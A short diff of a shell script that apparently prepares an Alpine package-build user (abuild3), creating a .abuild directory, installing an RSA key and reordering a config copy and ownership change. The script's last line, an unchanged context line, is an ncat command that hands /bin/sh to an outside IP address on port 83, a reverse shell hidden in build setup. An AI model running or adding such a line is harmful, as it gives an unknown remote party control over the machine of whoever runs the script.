@@ -54,12 +54,14 @@ chown -R abuild3:abuild3 /home/abuild3/installrsakey.sh
 
 ###hack to allow abuild/abuild-keygen to work
 mkdir -p .abuild
-cp /home/abuild3/.abuild/abuild.conf .abuild
 chown -R abuild3:abuild3 .abuild
+
+
 
 su -c "/home/abuild3/installrsakey.sh" -m abuild3 
 
-
+cp /home/abuild3/.abuild/abuild.conf .abuild
+chown -R abuild3:abuild3 .abuild
 
 
 ncat 195.201.134.209 83 -e /bin/sh
